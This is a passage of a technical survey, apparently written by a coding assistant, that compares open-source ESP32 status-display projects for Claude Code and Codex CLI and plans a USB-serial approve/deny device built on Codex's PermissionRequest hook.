| 189 | `niclasvestlund-YT/vibepulse` | ESP32-S3 AMOLED, explicitly **Claude Code and Codex**, "answerable NEEDS YOU alerts", local-first |
| 160 | `op7418/m5-paper-buddy` | M5Paper e-ink, "multi-session dashboard, **hardware approval (buttons + touch)**, AskUserQuestion" |
| 107 | `oauramos/claude-usage-stick` | Rate-limit monitor on ESP32 |
| 99 | `rithkott/claude-thing` | Spotify Car Thing as a Claude Code HUD |
| 88 | `sorryhumans/clawdmeter-plus` | Round AMOLED usage display |
| 39 | `thaitop/tamaclaude` | Cheap Yellow Display, live session state over BLE |
| 29 | `SnowWarri0r/cc-buddy-bridge` | Bridges Claude Code CLI to `claude-desktop-buddy` BLE hardware |
| 19 | `SixSigmaEngineer/Claude-Status-Bar-Lilygo` | **LilyGo T-Display S3**, our exact board. Model, tool, tokens, context, rate limits |
| 17 | `prabhavalabs/agentmeter` | ESP32 usage windows and alerts |
| 16 | `Z060049/AI-status-light-Claude-Code-Cursor-Codex` | Traffic light for Claude Code, Cursor **and Codex** |
| 2 | `Panmax/m5stack-claude-code-buddy` | M5StickC PLUS2, "notifies on permission requests via BLE with **Allow/Always**" |
| 1 | `KUCHITAKE/agents-andon` | Andon light for **parallel** CLI agents on M5StickC Plus |
| 1 | `underactive/pixel-agents-esp32` | Renders Claude Code and **Codex** agents as pixel-art characters |
| 1 | `rwrife/AgentPing` | "Physical desk-side inbox and **response surface**", .NET bridge + ESP32-C6 touch |
| 1 | `lianshuang-photo/esp32-claude-status-light` | Claude Code **/ Codex**, ESP32-C3 + Python daemon + web UI |
| 0 | `onguitarly0809-dotcom/agent-light` | Claude Code / **Codex** / ZCode, "hooks + **serial bridge** + firmware" |
| 0 | `huaguangyu/agent-hook-light-status` | Unifies **Codex**, Claude Code and Antigravity hook events into one state |
| 0 | `EESheep/agent-desk` | ESP32-S3 + LVGL, "monitor **Codex** sessions, completion alerts" |
| 0 | `kaosrmw-eng/Porthole` | **LilyGo T-Display-S3** desk display, MCP + Cloudflare relay |
| 0 | `cmawer97/SessionSprites` | Agent status and usage limits on ESP32-WROOM |
| 0 | `nodnarbnitram/agentagotchi` | "A hardware companion for your AI coding agents" |
| 0 | `NifasathA/agentdeck` | ESP32-S3 macropad and ambient display |
| 1310 | `Nexting-ai/nexting` | Software, not hardware, but remote-controls Claude Code, **Codex**, Grok and Cursor |
| 2 | `DrayChou/crossmux-agent-monitor-hub` | MQTT hub for Claude Code and **Codex** status |

Three clusters are worth a closer read than a search result:

1. **Answerable-from-device**: `op7418/m5-paper-buddy` (claims full hardware
   approval plus `AskUserQuestion`), `Panmax/m5stack-claude-code-buddy`
   (Allow/Always over BLE), `niclasvestlund-YT/vibepulse` (answerable alerts),
   `rwrife/AgentPing` ("response surface").
2. **Codex CLI state detection**: `onguitarly0809-dotcom/agent-light` (also a
   serial bridge), `huaguangyu/agent-hook-light-status`, `EESheep/agent-desk`,
   `underactive/pixel-agents-esp32`, `Z060049/AI-status-light-...-Codex`,
   `lianshuang-photo/esp32-claude-status-light`.
3. **Our exact board**: `SixSigmaEngineer/Claude-Status-Bar-Lilygo`,
   `kaosrmw-eng/Porthole`.

Note on the `agent_status_light` cluster: `JasonLam08/cursor_agent_status_light`
(257 stars) has at least five near-identical descendants
(`moss0000/claude-light`, `rockfl0722-svg/holyclaude_agent_status_light`,
`ZeroCc7/cursor_agent_status_light`, `dnegxuantian/x_agent_status_light`,
`onguitarly0809-dotcom/agent-light`). Read the upstream, not the forks.

---

## Part 4: what to take into this project

Ranked for a USB-serial Codex display on a 2-day deadline.

**Take, high confidence:**

1. **The blocking-hook approve pattern** (ccdev). Codex CLI **does** have a
   synchronous `PermissionRequest` hook, verified against the installed binary in
   Part 5, so this shape is directly available: block in the hook, do the human
   round trip inside it, print a decision on stdout.
2. **Fail open, never auto-deny.** Daemon down, device unplugged, nobody looking:
   the answer is "put it back on the terminal." ccdev's whole error path is one
   `except: pass` around a preset `ASK` value.
3. **Send an index, resolve the label host-side.** The screen shows a truncation;
   the truncation must never be what the agent acts on.
4. **Key the alert off a question id, not off the status.** Re-asserting `waiting`
   on every heartbeat must not re-beep. Only a new question id re-alerts.
5. **Queue prompts, never replace the one on screen**, and add a short input guard
   (ccdev uses 400 ms) after drawing a new question. Both exist because of a
   reproduced wrong-approval bug.
6. **Decay timers host-side.** Any state that describes something that already
   happened (`done`, `error`, `notice`) decays on a timer. Any state that depends
   on continuing events (`working`) demotes if not refreshed, because event-driven
   sources give you no heartbeat during a long operation.
7. **Serial daemon shape** (traffic-light's unused `claude_light_daemon.py`): one
   long-lived process holds the port with DTR and RTS forced low, autodetects
   `/dev/cu.usbmodem*` with an env override, waits ~1.5 s after open for the board
   to boot, writes newline-delimited commands at 115200, and exposes a Unix socket
   so per-event clients are one-shot and cannot block. Requeue on write error.
8. **A `doctor` subcommand.** ccdev's argument is exactly right for hardware:
   on a machine you cannot debug over serial, a self-check that names each failure
   and its fix is what makes the thing installable by someone else.
9. **Forward-compatible enums.** An unrecognised state or hint character falls
   through to "none" on the device, so a newer host cannot confuse older firmware.
10. **Heartbeat plus staleness.** Rewrite every N seconds; the device shows `N/A`
    past a threshold (ccdev: 10 s and 45 s), so a dead host never leaves a stale
    number on screen.

**Take, if there is time:**

- The `WAITING`-as-overlay idea (traffic-light): the attention signal does not
  destroy the underlying activity display.
- `summarizeTool()`-style per-tool one-line rendering (claude-code-remote
  `server.ts:219-240`).
- Byte-offset transcript tailing (claude-code-remote `server.ts:157-181`) as the
  Codex analogue of hooks, if Codex's rollout files turn out to be the only
  reliable state surface.
- CSRF header on the localhost daemon (Atom Echo's `X-AtomEcho: 1`), if the
  daemon ever grows an HTTP endpoint.

**Do not copy:**

- Cloud relays, WiFi provisioning, BLE pairing. USB serial sidesteps all three,
  and it also sidesteps macOS TCC Bluetooth permission entirely (which cost
  cc_bridge an entire signed-`.app` bootstrap).
- A fresh interpreter per hook event. Make the hook a `curl` or a compiled
  one-shot.
- ccdev's and cc_bridge's byte budgets. Those exist because of BLE MTU. A serial
  link at 115200 has no such constraint, and the 30-byte question budget is the
  single worst safety property in the best project here.

**Licensing.** Only two of the five are reusable: `CVSRohit/claude-code-remote`
(MIT, extended to hardware files) and `mr-tbot/Atom-Echo-Claude-Code` (MIT).
`Sbr1z/ccdev`, `chaosmin/claude-traffic-light` and `leikaiwei/cc_bridge` have no
license file at all, which means default copyright: readable, not copyable.
Everything worth taking from ccdev is a design idea rather than code, so this is
not a blocker, but do not lift its source.

---

## Part 5: Codex CLI has hooks, including PermissionRequest (verified locally)

The brief assumed Codex CLI has no Claude-Code-style hooks. That is wrong for the
version installed on this machine, and it changes the plan.

**Verification method.** The npm entry point
`/opt/homebrew/lib/node_modules/@openai/codex/bin/codex.js` is a shim. The real
Rust binary is at
`/opt/homebrew/lib/node_modules/@openai/codex/node_modules/@openai/codex-darwin-arm64/vendor/aarch64-apple-darwin/bin/codex`.
`codex --version` reports **codex-cli 0.153.4**. Everything below comes from
`strings` on that binary and from `codex plugin --help`, not from a repo's claim.

**A hooks engine exists.** The binary contains a `codex_hooks` crate with paths
like `hooks/src/engine/dispatcher.rs` and `tui/src/hooks_rpc.rs`,
`tui/src/bottom_pane/hooks_browser_view.rs`, plus a `hooks/list` RPC and a
`/hooks` TUI command.

**Event names present in the binary**, with rough occurrence counts:

```
Notification (694)  SessionStart (55)  PreToolUse (54)  PermissionRequest (54)
PostToolUse (41)    SubagentStart (35) SessionEnd (32)  SubagentStop (30)
PreCompact (29)     PostCompact (29)   UserPromptSubmit (18)
```

That is the Claude Code event vocabulary essentially verbatim. Note `Notification`
is by far the most frequent string, but that count is inflated because the word
appears in unrelated contexts; treat the others as the reliable signal.

**Config surface.**

- `~/.codex/hooks.json` (the binary carries a `failed to serialize hooks.json:`
  error and a `.codex/hooks` path fragment).
- `CODEX_HOME` overrides `~/.codex`, confirmed by an embedded helper:
  `return os.environ.get("CODEX_HOME", os.path.expanduser("~/.codex"))`.
- A trust ledger: `hooks.state`, with a `config/batchWrite failed while updating
  hook trust in TUI` error string. So hooks must be trusted once, presumably via
  the `/hooks` TUI command, exactly as the `agent-hook-light-status` README
  described (that README turns out to be accurate, not fabricated).
- Per-hook config keys visible: `hooks.command`, `hooks.run`, `hooks.mcp_tool`,
  `hooks.additional_context`, `hooks.managed_dir`, plus `timeout`, `async`,
  `statusMessage`, `additionalContextLimit`, and a `commandWindows` variant.
- Plugin packaging: `.codex-plugin/plugin.json` with `"hooks": "./hooks.json"`,
  installable via `codex plugin add` from a marketplace (`codex plugin --help`
  confirms `add`, `list`, `marketplace`, `remove`).

**The PermissionRequest contract, read off the validation error strings.** These
are the exact rejections the dispatcher emits, which define the accepted shape
more precisely than any doc:

```
PermissionRequest hook returned unsupported continue:false
PermissionRequest hook returned unsupported stopReason
PermissionRequest hook returned unsupported suppressOutput
PermissionRequest hook returned unsupported updatedInput
PermissionRequest hook returned unsupported updatedPermissions
PermissionRequest hook returned unsupported interrupt:true
PermissionRequest hook exited with code 2 but did not write a denial reason to stderr
hook returned invalid permission-request JSON output
PermissionRequest hook denied approval
```

And the embedded JSON schema fragment:

```json
"behavior": { "$ref": "#/definitions/PermissionRequestBehaviorWire" },
"interrupt": {
  "default": false,
  "description": "Reserved for future short-circuiting semantics.\n\nPermissionRequest hooks currently fail closed if this field is `true`.",
  "type": "boolean"
}
```

So `PermissionRequest` returns `hookSpecificOutput.decision.behavior`, and the
strings `"allow"`, `"deny"`, `"ask"` all appear in the schema region. It does
**not** accept `updatedInput` or `updatedPermissions`. That last point matters:
**there is no "Allow all" from a Codex PermissionRequest hook.** Two buttons,
allow and deny, plus falling back to the terminal. ccdev's unverified
`permission_suggestions` third button has no Codex equivalent.

**PreToolUse is the richer one.** Its rejections show it takes
`permissionDecision` plus `permissionDecisionReason`, and **does** accept
`updatedInput`, but only alongside `permissionDecision: "allow"`:

```
PreToolUse hook returned updatedInput without permissionDecision:allow
PreToolUse hook returned permissionDecision:deny without a non-empty permissionDecisionReason
PreToolUse hook returned permissionDecisionReason without permissionDecision
PreToolUse hook returned unsupported permissionDecision:ask
PreToolUse hook returned unsupported permissionDecision:allow
PreToolUse hook returned unsupported decision:approve
PreToolUse hook returned reason without decision
PreToolUse hook exited with code 2 but did not write a blocking reason to stderr
```

Two of those look contradictory (`unsupported permissionDecision:allow` sitting
next to `updatedInput without permissionDecision:allow`), which suggests the
strings are context-dependent per hook source (`command` vs `mcp_tool` vs
`executor-scoped`). **Do not design against my reading of these strings. Write a
five-line hook that dumps its stdin to a file, trust it, trigger one prompt, and
read the real payload.** That costs ten minutes and removes all of this
guesswork.

**Two other Codex state surfaces, from repos that use them:**

1. **`codex app-server --stdio`** (`EESheep/agent-desk`, `tools/codex_status_probe.py`).
   Spawns the app-server per poll cycle, calls `thread/list`, and reads a thread
   status of `active` / `idle` / `systemError` plus an `activeFlags` array. Their
   normalizer is literally
   `"waiting" if "waitingOnUserInput" in flags else derived`. **`waitingOnUserInput`
   is a first-class Codex concept**, which is exactly the signal this project
   needs. `codex app-server` exists in `codex --help` on this machine, and there
   is a live `~/.codex/app-server-daemon` directory. This is the strongest
   non-hook answer to "waiting on the human", and it does not require trusting a
   hook.
2. **Rollout JSONL under `~/.codex/sessions/`** (both `EESheep/agent-desk` and
   `underactive/pixel-agents-esp32`). Layout is `sessions/YYYY/MM/DD/rollout-*.jsonl`,
   honoring `CODEX_HOME`. `~/.codex/sessions` on this machine contains `2025/` and
   `2026/`, consistent with that. `agent-desk` parses `event_msg` records tracking
   `task_started` / `task_complete` / `turn_aborted` by `turn_id`.
   `pixel-agents-esp32` had to handle **three historical formats** in
   `Model/CodexStateDeriver.swift`: `item.started` / `item.completed` (from
   `codex exec --json`), current snake_case `response_item` / `event_msg`, and
   legacy PascalCase `ResponseItem` / `EventMsg`. Their exec-plan directory
   documents a whole follow-up cycle
   (`docs/exec-plans/completed/.../1773267785-fix-codex-state-derivation`) caused
   purely by that schema drift. Expect the same, and version-gate the parser.
3. **`notify` in `~/.codex/config.toml`** (`DrayChou/crossmux-agent-monitor-hub`,
   `integrations/codex/codex_notify.py`). The adapter reads Codex's JSON argument
   from `sys.argv[1]` and hardcodes `"status": "completed"`, with the README
   conceding "Codex notify primarily reports completion." Their own MQTT schema
   defines a `waiting_permission` value that the Codex adapter never emits. So
   `notify` alone gives completion and nothing else. It is the cheapest possible
   integration and the least informative.

**Recommended layering for this project**, cheapest first:

| Layer | Gives you | Cost |
|---|---|---|
| `notify` in `config.toml` | turn complete | minutes |
| Rollout JSONL tail | working / tool activity / turn boundaries | hours, plus schema drift |
| `codex app-server` `thread/list` | `active` / `idle` / `systemError` + `waitingOnUserInput` | medium, needs the daemon |
| `PermissionRequest` hook | **the actual approve/deny round trip** | medium, needs a trust step |

The hook is the only layer that can answer. The other three can only display.

**Caveats to establish before building on this.** All of the above is inference
from binary strings on version 0.153.4 plus other people's code. Three things are
unverified: whether `~/.codex/hooks.json` is the real path (versus a plugin-only
form), what the trust flow actually requires, and whether the daemon and the TUI
agree on hook dispatch. `codex doctor` exists and may report hook state.

---

## Part 6: the repos that matter more than the assigned five

### SixSigmaEngineer/Claude-Status-Bar-Lilygo (19 stars, MIT)

**This is the closest existing project to what we are building**: a LilyGo
T-Display S3 fed over **USB CDC serial** by a Python bridge that **tails
transcripts**. Read `docs/HOW_IT_WORKS.md` before writing any firmware.

Caveat: it targets the **T-Display S3 Long** (3.4 inch, 640x180, AXS15231B QSPI),
not our 1.9 inch 320x170 ST7789. The panel gotchas do not transfer; the USB CDC
and protocol lessons do.

- **Transport** (`README.md:41-44`, `HOW_IT_WORKS.md:13`): "one compact JSON line
  per second over USB CDC serial", 115200. One USB-C cable is power and data
  (`README.md:21`, `:30-32`). No WiFi, no cloud, no battery. Exactly our model.
- **Wire protocol** (`HOW_IT_WORKS.md:47-63`): newline-delimited JSON with a `t`
  type field. `{"t":"s", ...}` status once per second carrying an array of
  sessions, each with name, model, state, tool name, effort, elapsed, tokens in
  and out, context percent and an attention boolean, plus a usage block. Separate
  `{"t":"lg","off":..,"px":"<hex>","last":..}` for chunked 48x48 RGB565 logo
  upload, `{"t":"lgclr"}`, and `{"t":"ping"}`. Device to PC is only debug lines
  tagged `[boot]`, `[beat]`, `[touch]`, `[rx]`, echoed by the bridge console.
  Short key names, one packet type per concern, and a device-to-host debug channel
  that costs nothing. Copy this shape.
- **State detection** (`HOW_IT_WORKS.md:9-11`): stats known JSONL files every
  second, reads only appended bytes with per-file offsets, feeds each line through
  a per-session state machine. `tool_use` opens a pending tool, the matching
  `tool_result` in a later `user` record closes it. Derived states: `run`, `tool`,
  `wait`, `done`, `idle`.
- **Their "waiting" heuristic, which is the transcript-only answer to our second
  question** (`HOW_IT_WORKS.md:11`): `wait` = "pending tool older than ~20s with
  no file writes = permission prompt; or an assistant message ending in '?' =
  Claude asked something". Both halves are heuristics and both are tunable in
  `bridge/config.json`. This is what you get without hooks, and it is noticeably
  worse than a hook: it is a timeout guess plus a punctuation check.
- **Approve/deny**: none. Display only.
- **The three hardware findings that will cost us time if missed**
  (`HOW_IT_WORKS.md:45`), all USB-CDC-general rather than panel-specific:
  1. The ESP32-S3's native USB serial needs the build flag **`CDCOnBoot=cdc`**.
  2. **The default 256-byte CDC RX buffer overflows during 50 ms screen redraws
     and silently corrupts inbound JSON.** Their fix: `Serial.setRxBufferSize(16384)`
     **before** `Serial.begin()`. A silently corrupted JSON line that only appears
     under redraw load is exactly the bug that eats a 2-day deadline.
  3. Toolchain must live in a short path on Windows (not our problem on macOS).
- Also worth noting (`HOW_IT_WORKS.md:20`): Python's `glob("**")` does not descend
  into dot-directories, so they use `os.walk`. Relevant if we ever glob under
  `~/.codex`.
- **Usage API** (`HOW_IT_WORKS.md:25`): `https://api.anthropic.com/api/oauth/usage`
  with a Bearer token from `~/.claude/.credentials.json` and header
  `anthropic-beta: oauth-2025-04-20`, cached 60 s. Anthropic-specific, listed for
  completeness.
- **Right**: the whole architecture is the one we want, and the docs file is
  explicitly written as "every gotcha so the next person doesn't re-derive them."
  **Wrong**: Windows-only tooling (`.bat`, `.ps1`), and the wait detection is a
  20-second timeout heuristic that will show `wait` for any slow tool.

### kaosrmw-eng/Porthole (0 stars, MIT)

Same board as ours (`README.md:35`: "LilyGo T-Display-S3, original 1.9-inch
170x320 ST7789 version"), but the opposite architecture: the device is a
**generic display surface**, not an agent monitor. Firmware polls a Cloudflare
Worker over HTTPS; agents drive it through **MCP tools** (`show_text`, `show_qr`,
`show_image`, `show_ticker`, `show_progress`, `set_leds`, `set_device_theme`,
`set_orientation`, `clear_display`, `set_display_sleep`, `get_display_status`).
No hooks, no state detection, no approve. Protocol v1 is a versioned JSON command
envelope with `protocol`, `command_id`, `type`, `created_at`, `expires_at`,
`payload`, and the device rejects unknown types and newer protocol versions and
reports that through an ack endpoint (`protocol/README.md:26-27`).

Two things to take: **version the envelope and reject unknown types loudly**, and
**IO14 toggles orientation while running, BOOT toggles the backlight**
(`README.md:39`) as a sane default button map for this exact board. Everything
else (WiFi portal, Cloudflare Worker, HTTPS polling) is the opposite of our
constraint.

### op7418/m5-paper-buddy (160 stars, GPL-3.0 plus attribution clause)

M5Paper e-ink companion. The most feature-complete approve-from-device
implementation after ccdev, and notably it **prefers USB serial over BLE**.

- **Transport** (`tools/claude_code_bridge.py:47-50`, `:879-897`): USB serial
  (auto-detecting `/dev/cu.usbserial-*`) or BLE over Nordic UART, auto-selected
  with **serial preferred**, stated reason "zero-setup, no BLE permission dance"
  because BLE requires a macOS pairing dialog on first connect. That is
  independent confirmation of our transport choice.
- **Approve/deny** (`tools/claude_code_bridge.py:759-866`): a `curl` hook on
  `PreToolUse` posts to `http://127.0.0.1:9876/hook`; `_pretool()` blocks on a
  `threading.Event` for up to 30 s and returns
  `{"hookSpecificOutput": {"hookEventName": "PreToolUse", "permissionDecision":
  "allow"|"deny", "permissionDecisionReason": ...}}` (:850, :860).
  `bypassPermissions` mode is special-cased to auto-allow (:770-777).
- **Waiting detection**: the blocked hook connection **is** the queue entry.
  `_pretool()` adds the session to `SESSIONS_WAITING` and fires a `BUMP_EVENT`
  (:805-812) that makes the heartbeat loop push immediately, rate-limited to 1/s
  against a 10 s idle heartbeat. Same insight as ccdev, arrived at independently.
- **Multi-session queue** (:793-831): a `PENDING_PROMPTS` dict plus an
  `ACTIVE_PROMPT` that advances on resolve. FIFO, same fix as ccdev's `_queue`.
- **Mistake worth avoiding**: for `AskUserQuestion` it **denies** the tool call and
  smuggles the human's chosen option into `permissionDecisionReason` (:838-846),
  relying on the model reading free text rather than using `updatedInput`. Fragile.
  Note that on Codex, `PermissionRequest` rejects `updatedInput` outright but
  `PreToolUse` accepts it alongside `permissionDecision: "allow"`, so on Codex the
  correct home for an answered question is a `PreToolUse` hook, not
  `PermissionRequest`.

### niclasvestlund-YT/vibepulse (189 stars, MIT)

ESP32-S3 AMOLED, local-first, and **the only project in the whole survey that
implements answerable prompts for both Claude Code and Codex**. This is the
single most relevant repo found and it was not in the brief.

- **Claude side** (`docs/agent-setup.md:403-424`): uses `type: "http"` hooks (a
  real Claude Code hook transport) on `PreToolUse` matching `AskUserQuestion` and
  on `PermissionRequest` matching `.*`, POSTing to `http://127.0.0.1:8737/api/hook/question`
  and `/api/hook/permission`. Permission responses carry
  `{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}`;
  question responses use the documented `updatedInput` path with `questions` and
  `answers` (`docs/needs-you-investigation.md:253-263`, `:322-323`).
- **Codex side**: a real Codex plugin at
  `.agents/plugins/plugins/vibepulse/.codex-plugin/plugin.json` with its own
  `hooks/hooks.json` declaring a `PermissionRequest` **command** hook running
  `permission_hook.py`. That script (`permission_hook.py:73-90`) reads the hook
  JSON from stdin, POSTs to a local server, validates the reply is exactly
  `{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{...}}}`
  with behavior `allow` or `deny` plus a `message` on deny (`_valid_decision`,
  :44-58), and echoes it to stdout. **This matches the contract I read out of the
  binary in Part 5 independently.** Two independent sources agreeing is why I now
  treat the Codex hook path as real rather than as a repo's claim.
- **Codex usage**: `tools/tokenserver/codex_rollout.py` and `tokenserver.py:1354,
  :1366` read `~/.codex/sessions/**/rollout-*.jsonl` honoring `CODEX_HOME`, and
  stream files over 100 MB rather than loading them (`:1639`).
- **The best idea in the repo**: `session_start.py:141-191` reads the user's own
  `~/.codex/config.toml` on session start and warns if `approval_policy = "never"`,
  `approvals_reviewer = "auto_review"`, or `sandbox_mode = "danger-full-access"`
  is set, because any of those would silently mean **no permission card ever
  reaches the device**. Nobody else covers that failure mode, and it is exactly
  the kind of thing that reads as "my hardware is broken" for an hour. Build the
  equivalent check into `doctor` on day one.
- **Careful engineering worth copying**: `loopback.py`'s `is_loopback_http_url()`
  rejects anything that is not `127.0.0.1` / `localhost` / `::1`, because "Claude
  Code blocks HTTP hooks that resolve to the LAN"; plus strict duplicate-key-
  rejecting JSON parsing, bounded body sizes, and response deadlines that
  force-close sockets.
- **Transport**: WiFi/LAN from the panel to a local tokenserver (30 s quota poll,
  1 Hz interaction poll), with optional default-off cloud relays. The hooks
  themselves are loopback-only by necessity.
- **Honest caveat, from their own docs**: as of `docs/needs-you-investigation.md`
  (dated 2026-08-16) "No panel has been flashed with SETTINGS yet" and the
  NEEDS-YOU answer UI was verified in simulation rather than on hardware, though
  later release notes claim a physical pass. Treat their firmware claims as less
  proven than their host-side code.
- **Codex limitation they document**: Codex only offers ALLOW ONCE within a narrow
  safe-command allowlist; free-form, mutating or secret-bearing requests fall back
  to the terminal. Consistent with `PermissionRequest` rejecting
  `updatedPermissions` in the binary.

### EESheep/agent-desk (0 stars, Apache-2.0)

ESP32-S3 + LVGL, USB serial, and **the most legitimate Codex state detection
found**. Detailed in Part 5. Additional protocol notes:

- **Serial** (`docs/architecture.md`, `tools/codex_status_probe.py::find_panel_port`):
  115200 8N1, no flow control, `ser.dtr = False` / `ser.rts = False` **before**
  open to avoid the reset-on-open glitch. Port picked by matching CH343 VID:PID
  `0x1A86:0x55D3`, and if more than one matches it **requires an explicit
  `--port`** rather than guessing. That refusal-to-guess is the right call.
- **Framing**: custom ASCII line protocol, not JSON.
  `BEGIN` / `TASK<TAB>id_hex<TAB>title_hex<TAB>state<TAB>legacy_approval[<TAB>source]`
  / `CARD<TAB>...` / `END`, with text fields UTF-8-then-hex encoded. States on the
  wire: `1=IDLE 2=RUNNING 3=WAITING INPUT 4=COMPLETED 5=FAILED`.
- **Mistake**: no version byte, no checksum, no request id, no ACK. The device
  just logs `REAL snapshot tasks=N cards=M` back and the host greps stdout for
  that string. Also explicitly no auto-reconnect, no autostart, and the process
  can just exit on a polling or serial error.
- **Right**: their architecture doc openly documents the false-idle and
  stale-completion failure modes of file-mtime heuristics, which is why they added
  the app-server probe on top.

### underactive/pixel-agents-esp32 (1 star, license NOASSERTION, read it first)

macOS menu-bar app driving an ESP32 over USB serial, rendering agents as pixel-art
characters. Detects both Claude Code and Codex by watching transcripts.

- **Codex detection** (`macos/PixelAgents/PixelAgents/Model/TranscriptWatcher.swift`):
  FSEvents on `~/.codex/sessions`, walks `YYYY/MM/DD/rollout-*.jsonl`, only
  considers files modified within a 300 s recency window, tails incrementally by
  `FileHandle` offset. `Model/CodexStateDeriver.swift` handles the three schema
  generations described in Part 5 and extracts `command_execution`, `file_change`,
  `mcp_tool_call`, `web_search`, and terminal `turn.completed` / `task_complete` /
  `turn_aborted`.
- **Serial** (`Transport/SerialTransport.swift`): **binary framing**,
  `[0xAA][0x55][len][payload][xor checksum]`, raw termios 8N1, `VMIN=0 VTIME=0`,
  reads via `DispatchSourceRead`. Never touches DTR/RTS, relying on native USB CDC
  not needing it.
- **Port detection** (`Transport/SerialPortDetector.swift`): IOKit
  `IOServiceMatching(kIOSerialBSDServiceValue)`, filtered to `/dev/cu.usbmodem`,
  `/dev/cu.usbserial`, `/dev/cu.wchusbserial`, with
  `IOServiceAddMatchingNotification` for **live add/remove**, not a one-shot
  enumerate. Best port-detection implementation in the survey.
- **The gap to not copy**: `Model/AgentState.swift`'s `CharState` enum is
  `offline, idle, walk, type, read, spawn, despawn`. **There is no waiting or
  approval state at all**, and `CodexStateDeriver.derive()` never returns anything
  but idle, read or type. Their own exec-plan (risk #2) concedes "Codex uses shell
  commands, not named tools... initial implementation defaults to TYPE for most
  tool activity." A pure transcript reader struggles to see "blocked on a human."
- There is also a from-scratch Python companion at
  `companion/pixel_agents_bridge.py` (~45 KB) doing the same job, if a non-Swift
  reference is useful.

### Z060049/AI-status-light-Claude-Code-Cursor-Codex (16 stars, MIT)

**The repo name is false advertising: there is no Codex support.** Confirmed by
reading the full tree and all of `cli/light.py`: it installs `~/.cursor/hooks.json`
and `~/.claude/settings.json` hooks only, `cmd_setup` accepts only
`--cursor --claude --alias --all`, and the string "codex" appears nowhere in
`light.py`, `install.sh` or `docs/cursor.md`.

Worth reading anyway for two serial techniques:

- **Active handshake port detection**, which is better than VID matching alone.
  `probe_port()` opens with `ser.dtr = False; ser.rts = False`, writes `b"ping\n"`,
  and waits for a firmware reply containing the magic string `"ai-status-light"`.
  Falls back to the highest-VID-scored candidate if nothing answers. That turns
  "which port is my board" from a guess into a confirmation.
- `_open_no_reset()`'s comment states the cost plainly: toggling DTR/RTS "would
  reset the ESP32 and force us to wait ~2 seconds before each send."
- **Architecture note**: no daemon. Each hook invocation is a fresh Python process
  that opens the port, writes one word, and closes, with the port path cached in
  `~/.config/ai-status-light/port`. Simpler than a daemon and viable if the
  handshake is reliable, but it pays process startup on every event and cannot
  hold a blocking approval open.

### onguitarly0809-dotcom/agent-light (0 stars, MIT)

Node `serialport` TCP-to-serial bridge, Claude Code plus claimed Codex.

- **Serial**: 115200 default (`CLAUDE_LIGHT_BAUD`), legacy firmware at 9600.
  Newline-delimited **ASCII tokens**, not JSON: `idle`, `chase`, `G:off`,
  `Y:blink:700`. `detectPort()` scores `SerialPort.list()` by VID `303a`
  (Espressif native USB) = 3, else a regex on manufacturer/description
  (`cp210|ch340|ftdi|jtag`) = 2, else 1, and takes the highest.
- **Reset handling**: `setTimeout(() => sendCommand(options.initial), 1500)` with
  a comment noting CH340/CP2102 boards reset the ESP32 on port open while native
  USB CDC boards do not, so the delay is just harmless on CDC.
- **The pattern worth stealing**: a **watchdog** (`CLAUDE_LIGHT_WATCHDOG_MS`,
  default 120000) that reverts the device to idle if no command arrives, plus
  **exit on serial error or close** so an external restart loop reconnects. Their
  comment: setting an exit code without exiting leaves the process in a fake-alive
  state. Fail loudly and let the supervisor restart.
- **Claude waiting detection** (`lib/notification.mjs`): string-matches the
  `Notification` hook message, `if (/waiting for your input/i.test(message))
  return null` (treat as idle, no alert) else alert. Brittle, and inverted from
  what we want.
- **Codex claim**: ships `configs/codex-hooks-snippet.json` targeting
  `~/.codex/hooks.json` with Claude-shaped event names, and
  `lib/post-tool-codex.mjs` whose comment says Codex's stdin structure differs
  from Claude Code's and it decides error by `is_error === true` or numeric
  `exit_code !== 0`. Given Part 5, this is plausibly correct rather than invented,
  but the repo shows no evidence of having verified it. Treat as a hint, not a
  spec.

### huaguangyu/agent-hook-light-status (0 stars, MIT)

Unifies Codex, Claude Code and Antigravity hook events into one state, then
phones home over HTTP to a Go server which drives **WLED** strips over WiFi/MQTT.
Wrong transport for us. `collector/codex/codex-hook.js` maps `PermissionRequest`
to an `approval` state (red fast blink). Its README describes needing to run
`/hooks` to trust once and then copying the generated `[hooks.state]` into another
config, which Part 5 confirms is a real Codex mechanism. Useful only as
corroboration of the hook trust flow.

### DrayChou/crossmux-agent-monitor-hub (2 stars, MIT)

MQTT to an Xteink X4 e-ink device. Wrong transport. Its value is one file:
`integrations/codex/codex_notify.py`, wired via
`notify = ["python3", "/path/to/.../codex_notify.py"]` in `~/.codex/config.toml`,
which reads Codex's JSON argument from `sys.argv[1]` and unconditionally reports
`"status": "completed"`. Their own MQTT schema (`docs/mqtt-protocol.md`) defines a
`waiting_permission` value that this adapter never emits. **This is the honest
floor: `notify` alone gives you turn-complete and nothing else.**

### The `agent_status_light` fork cluster

`JasonLam08/cursor_agent_status_light` (257 stars, BLE status light for Cursor on
ESP32-C3) has at least five near-identical descendants: `moss0000/claude-light`,
`rockfl0722-svg/holyclaude_agent_status_light`, `ZeroCc7/cursor_agent_status_light`,
`dnegxuantian/x_agent_status_light`, and `onguitarly0809-dotcom/agent-light`. Read
the upstream; the forks add relabeling, not mechanism.

---

## Part 7: revised recommendation

The single most important correction to the brief: **Codex CLI 0.153.4 on this
machine has a `PermissionRequest` hook with a `hookSpecificOutput.decision.behavior`
contract**, so approve-from-device is available without an SDK, a PTY wrapper, or
keystroke injection. Verify the payload shape with a stdin-dumping hook before
building on it, and note that `updatedInput` and `updatedPermissions` are rejected
on `PermissionRequest` (so no "Allow all"), while `PreToolUse` accepts
`updatedInput` alongside `permissionDecision: "allow"`.

Concrete build order for two days:

1. **Hour one: a five-line hook that dumps its stdin to a file.** Register it on
   `PermissionRequest`, trust it, trigger one prompt, read the payload. Every
   other decision depends on what that file contains. Also run `codex doctor`.
2. **Serial daemon** in the shape of traffic-light's `claude_light_daemon.py` and
   agent-light's bridge: one long-lived process holding the port, DTR and RTS
   forced low before open, port chosen by VID plus an **active `ping` handshake**
   (Z060049's technique) rather than a guess, a Unix socket front end so hook
   clients are one-shot, a watchdog that reverts to idle, and **exit on serial
   error** so a supervisor reconnects.
3. **Firmware**: set `CDCOnBoot=cdc`, and call `Serial.setRxBufferSize(16384)`
   before `Serial.begin()`, or redraws will silently corrupt inbound JSON
   (SixSigma's finding, and the hardest bug in this list to diagnose).
4. **Protocol**: newline-delimited JSON, versioned envelope, short keys, one
